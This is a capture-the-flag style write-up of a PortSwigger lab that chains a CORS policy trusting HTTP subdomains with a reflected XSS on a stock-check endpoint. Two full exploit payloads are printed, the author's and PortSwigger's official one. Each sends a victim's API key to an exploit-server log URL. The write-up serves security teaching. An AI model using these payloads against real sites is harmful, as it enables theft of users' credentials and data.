# CORS vulnerability with trusted insecure protocols

**Category:** CORS
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/cors/lab-breaking-https-attack

Migrating to HTTPS is supposed to close off an entire class of network-level attacks, but that
protection only holds if every trust decision the application makes actually requires HTTPS. A
CORS configuration that whitelists a subdomain regardless of scheme quietly reopens that door — and
if the plain-HTTP subdomain has its own vulnerability, the two flaws chain into a complete bypass of
the HTTPS boundary the rest of the app depends on.

## The Target

The same HTTPS account page and `/accountDetails` API key endpoint as the previous two labs, plus a
second surface: a stock-check feature that talks to `stock.<lab-host>` — reachable over plain HTTP
— and takes a `productId` query parameter.

## The Investigation

Testing `/accountDetails` with an `Origin` header built from the HTTP stock subdomain
(`http://stock.<lab-host>`) got the same result as the previous two labs: ACAO reflected that exact
origin, with `Access-Control-Allow-Credentials: true`. The target trusted its own subdomains
regardless of whether the request was actually protected by TLS — an HTTP origin was just as
trusted as an HTTPS one.

That's only interesting if something can run script from that HTTP origin, so the next step was
the stock-check page itself. Loading `http://stock.<lab-host>/?productId=1&storeId=1` and sending
an invalid `productId` reflected the value into the page unescaped — a classic reflected XSS. Two
details made this fiddlier than a typical XSS injection point, both recorded as critical lessons in
our internal notes:

- Without `&storeId=`, the endpoint returns a JSON error (`"Missing parameter: store ID"`) instead
  of the HTML error page the XSS actually lives in — the parameter has to be present for the
  reflection to render as markup at all.
- Because the entire payload had to travel as a query string inside a `document.location` redirect
  (not typed directly into a form field), it went through a full URL encode/decode round-trip.
  Anything in the JavaScript payload that used a literal `+` for string concatenation got decoded
  by the server as a space, which broke the script's syntax. Swapping to `.concat()` for string
  joining survived that round-trip untouched, since `.concat()` contains no `+` character at all.

We also had to URL-encode the closing tag of the injected `<script>` as `%3c/script>` rather than
writing it literally, since a literal `</script>` inside the outer exploit-server page's own
`<script>` block would have closed that outer element early. The browser decodes `%3c` back to `<`
only once it navigates to the target URL, by which point it's inside the HTML response body rather
than inside our exploit script.

## The Exploit

The final delivery page redirects the victim's browser to the vulnerable stock endpoint, with the
CORS-stealing script embedded as the injected `productId` value:

```html
<script>
  document.location = "http://stock.TARGET/?productId=1<script>var req=new XMLHttpRequest();req.onload=function(){location='https://EXPLOIT-SERVER/log?key='.concat(this.responseText)};req.open('GET','https://TARGET/accountDetails',true);req.withCredentials=true;req.send();%3c/script>&storeId=1";
</script>
```

When the victim's browser lands on that URL, the server reflects the injected script into the HTML
error page and executes it. That script runs in the `http://stock.<lab-host>` origin, sends a
credentialed `XMLHttpRequest` to the HTTPS `/accountDetails` endpoint, and because the target trusts
that HTTP subdomain as an origin, the response comes back readable. `.concat()` builds the
exfiltration URL without ever introducing a literal `+` for the server's URL-decoding to mangle, and
the API key ships out to the exploit server log exactly as in the previous two labs.

We delivered this page from the exploit server, waited for the victim's request to land, and pulled
the `apikey` field back out of the URL-decoded access log to submit as the solution.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's official solution follows the same chain — confirm the target trusts arbitrary HTTP
subdomains as CORS origins, find the `productId` XSS on the stock subdomain, and combine them into
a redirect that fires the CORS theft from inside the reflected script. Their exact payload is:

```html
<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
```

This is a genuinely interesting point of convergence rather than an identical payload: PortSwigger
hit the exact same `+`-becomes-space problem we did, and solved it differently. Their fix is
`%2b` — the URL-encoded form of `+` itself, so it survives the decode round-trip as a literal plus
sign and the JavaScript concatenation works as written. Ours was `.concat()`, which sidesteps the
problem entirely by not using `+` at all. Both are correct fixes for the same root cause; theirs
keeps the original `+`-based syntax intact by encoding around the decoding step, ours restructures
the JavaScript so there's nothing for the decoding step to damage. The `%3c/script>` escape and the
trailing `&storeId=1` placement match exactly, confirming those weren't quirks specific to our
delivery method but real constraints of the endpoint itself.

## What This Teaches Us

This lab is really two independent bugs that are each only moderately interesting on their own,
chained into something with actual consequence. A CORS policy that accepts `http://` origins on an
HTTPS site throws away the isolation TLS is supposed to provide, since anyone who can run script on
the insecure origin — whether through XSS, network interception, or a compromised CDN — inherits
whatever trust that origin carries. And a reflected XSS on a "low value" subdomain like a stock
checker is never really low value if that subdomain shares a CORS trust relationship with the main
application. The fix has to happen on the CORS side, not just the XSS side: origin allowlists
should specify an exact scheme, host, and port, with no implicit trust extended across protocols
even within the same organization's own subdomains.
